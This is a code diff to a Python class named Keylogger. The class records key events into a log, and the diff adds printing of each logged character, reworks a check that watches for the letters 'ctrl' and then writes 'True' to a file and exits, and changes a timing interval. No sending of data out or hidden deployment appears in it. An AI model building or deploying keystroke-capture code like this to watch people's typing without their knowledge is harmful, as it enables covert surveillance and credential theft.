@@ -19,6 +19,8 @@ class Keylogger:
         name = event.name
         if self.mode == "out_for_other_app":
             self.log += name
+            for i in range(len(self.log)):
+                print(self.log[i])
             x = False
             j = len(self.log) - 1
             while j >= 0:
@@ -29,12 +31,16 @@ class Keylogger:
                 j -= 1
             if x:
                 try:
-                    if (self.log[i + 1] == "c" and self.log[i + 2] == "t" and self.log[i + 3] == "r" 
-                    and self.log[i + 4] == "l") or (self.log[i - 1] == "c" and self.log[i - 2] == "t" 
-                    and self.log[i - 3] == "r" and self.log[i - 4] == "l"):
+                    if self.log[i + 1] == "c" and self.log[i + 2] == "t" and self.log[i + 3] == "r" and self.log[i + 4] == "l":
                         open(self.true_file_path, "w").write("True")
                         sys.exit()
-                except IndexError as e:
+                except Exception:
+                    pass
+                try:
+                    if(self.log[i - 1] == "l" and self.log[i - 2] == "r" and self.log[i - 3] == "t" and self.log[i - 4] == "c"):
+                        open(self.true_file_path, "w").write("True")
+                        sys.exit()
+                except IndexError:
                     pass
         else:
             if len(name) > 1:
@@ -67,7 +73,7 @@ class Keylogger:
 
     def start(self):
         if self.mode == "out_for_other_app":
-            self.interval = 1
+            self.interval = 3
         else:
             while True:
                 try:
